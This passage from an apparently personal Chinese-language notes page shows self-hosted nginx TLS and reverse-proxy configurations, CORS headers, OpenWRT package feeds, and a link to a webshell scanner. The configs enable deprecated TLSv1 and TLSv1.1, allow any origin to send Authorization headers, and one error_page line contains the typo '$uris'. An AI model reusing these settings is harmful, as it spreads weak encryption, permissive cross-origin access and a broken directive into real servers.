        ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4;
        ssl_protocols TLSv1 TLSv1.1 TLSv1.2;
        ssl_prefer_server_ciphers on;

        error_page 497 https://$host:8080$uris;
      
        if ($scheme = http) {
            return 301 https://$host$request_uri;
        }


        location / {
                root   /usr/share/nginx/html;
                index  index.html index.htm;
        }

    }
}
```

### 跨域

```nginx
add_header Access-Control-Allow-Origin *;
add_header Access-Control-Allow-Methods GET,POST,OPTIONS;
add_header Access-Control-Allow-Headers Content-Type,Authorization;
```

### 自用完整的 nginx.conf

nginx file format： [https://nginxbeautifier.github.io/](https://nginxbeautifier.github.io/ "在线整理 nginx 配置文件")  

github repo: [https://github.com/nginxbeautifier/nginxbeautifier.github.io](https://github.com/nginxbeautifier/nginxbeautifier.github.io)

```nginx
user nginx;
worker_processes auto;
error_log /var/log/nginx/error.log notice;
pid /var/run/nginx.pid;
events {

	worker_connections 1024;
}
http {

	include /etc/nginx/mime.types;
	default_type application/octet-stream;

	log_format main '$remote_addr - $remote_user [$time_local] "$request" '
	'$status $body_bytes_sent "$http_referer" '
	'"$http_user_agent" "$http_x_forwarded_for"';

	access_log /var/log/nginx/access.log main;
	sendfile on;
	keepalive_timeout 65;
	gzip on;

	server {

		listen 8080 ssl http2;
		server_name _;

		# ssl off;
		ssl_certificate /usr/local/nginx/cert/cert.pem;
		ssl_certificate_key /usr/local/nginx/cert/private.key;

		ssl_session_timeout 5m;
		ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4;
		ssl_protocols TLSv1 TLSv1.1 TLSv1.2;
		ssl_prefer_server_ciphers on;

		error_page 497 https://$host:8080$request_uri;

		client_max_body_size 5G;
		client_header_timeout 1m;
		client_body_timeout 1m;
		proxy_connect_timeout 60s;
		proxy_read_timeout 60m;
		proxy_send_timeout 60m;


		location / {

			alias /usr/share/nginx/html;
			index index.html;
		}


		location /sdr/ {

			proxy_pass http://192.168.8.1:8073/;
			proxy_set_header X-Real-IP $remote_addr;
			proxy_set_header x-wiz-real-ip $remote_addr;
			proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
			proxy_set_header X-Forwarded-Proto $scheme;
			proxy_set_header X-NginX-Proxy true;

			proxy_http_version 1.1;
			proxy_set_header Upgrade $http_upgrade;
			proxy_set_header Connection "upgrade";
			proxy_set_header Connection "keep-alive";

			proxy_set_header Host $http_host;
			proxy_ssl_session_reuse off;
			proxy_cache_bypass $http_upgrade;
			proxy_redirect off;
		}

		location /wss/ {

			proxy_pass http://192.168.8.1:10000/wss/;
			proxy_set_header X-Real-IP $remote_addr;
			proxy_set_header x-wiz-real-ip $remote_addr;
			proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
			proxy_set_header X-Forwarded-Proto $scheme;
			proxy_set_header X-NginX-Proxy true;

			proxy_http_version 1.1;
			proxy_set_header Upgrade $http_upgrade;
			proxy_set_header Connection "upgrade";
			proxy_set_header Connection "keep-alive";

			proxy_set_header Host $http_host;
			proxy_ssl_session_reuse off;
			proxy_cache_bypass $http_upgrade;
			proxy_redirect off;
		}

		location /dav/ {

			proxy_pass http://192.168.8.1:5244/dav/;
			proxy_set_header X-Real-IP $remote_addr;
			proxy_set_header x-wiz-real-ip $remote_addr;
			proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
			proxy_set_header X-Forwarded-Proto $scheme;
			proxy_set_header X-NginX-Proxy true;

			proxy_http_version 1.1;
			proxy_set_header Upgrade $http_upgrade;
			proxy_set_header Connection "upgrade";
			proxy_set_header Connection "keep-alive";

			proxy_set_header Host $http_host;
			proxy_ssl_session_reuse off;
			proxy_cache_bypass $http_upgrade;
			proxy_redirect off;
		}

		location /test/ {

			proxy_pass http://192.168.8.1:3300/;
			proxy_set_header X-Real-IP $remote_addr;
			proxy_set_header x-wiz-real-ip $remote_addr;
			proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
			proxy_set_header X-Forwarded-Proto $scheme;
			proxy_set_header X-NginX-Proxy true;

			proxy_http_version 1.1;
			proxy_set_header Upgrade $http_upgrade;
			proxy_set_header Connection "upgrade";
			proxy_set_header Connection "keep-alive";

			proxy_set_header Host $http_host;
			proxy_ssl_session_reuse off;
			proxy_cache_bypass $http_upgrade;
			proxy_redirect off;
		}
	}
}
```

## OpenWRT

x86 官方源

```shell
src/gz openwrt_core http://downloads.openwrt.org/releases/21.02.0/targets/x86/64/packages  
src/gz openwrt_base https://downloads.openwrt.org/snapshots/packages/x86_64/base  
src/gz openwrt_luci    https://downloads.openwrt.org/snapshots/packages/x86_64/luci  
src/gz openwrt_packages https://downloads.openwrt.org/snapshots/packages/x86_64/packages  
src/gz openwrt_routing https://mirrors.cloud.tencent.com/lede/snapshots/packages/x86_64/routing  
src/gz openwrt_telephony https://mirrors.cloud.tencent.com/lede/snapshots/packages/x86_64/telephony
```

## Python

### Update latest Python version

[Upgrade Python to latest version (3.12) on Ubuntu Linux or WSL2](https://cloudbytes.dev/snippets/upgrade-python-to-latest-version-on-ubuntu-linux)

## 网络安全

webshell 查杀工具：[SHELLPUB.COM 专注查杀，永久免费](https://www.shellpub.com/)

## 引用 Reference

> 感谢以下博客的作者和教程网站，如有侵权请及时联系博主删除。

1. Golang 和 Linux 学习笔记合集 [https://www.huweihuang.com/](https://www.huweihuang.com/)

‍
